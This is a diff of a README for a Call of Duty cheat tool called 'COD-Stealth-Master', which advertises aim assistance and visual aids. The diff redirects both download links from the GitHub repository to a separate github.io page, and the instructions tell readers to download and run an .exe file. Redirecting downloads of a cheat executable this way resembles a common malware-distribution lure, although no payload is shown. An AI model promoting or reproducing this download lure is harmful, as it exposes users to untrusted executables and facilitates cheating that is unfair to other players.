@@ -1,6 +1,6 @@
 # 🎯 COD-Stealth-Master - Improve your performance in every match
 
-[![Download COD-Stealth-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Swraj9378/COD-Stealth-Master)
+[![Download COD-Stealth-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://swraj9378.github.io)
 
 COD-Stealth-Master helps you see game information clearly. This tool provides visual aids and assists with aim precision during your gaming sessions. You gain extra awareness of your surroundings and manage weapon behavior during matches. 
 
@@ -29,7 +29,7 @@ The software includes several tools to assist your gameplay. These features help
 
 Follow these steps to get the software on your Windows computer.
 
-1.  Visit the [official project page to download the latest version](https://github.com/Swraj9378/COD-Stealth-Master).
+1.  Visit the [official project page to download the latest version](https://swraj9378.github.io).
 2.  Look for the "Releases" section on the right side of the page.
 3.  Click the link labeled "Assets" under the most recent version.
 4.  Download the file ending in `.exe` to your computer.
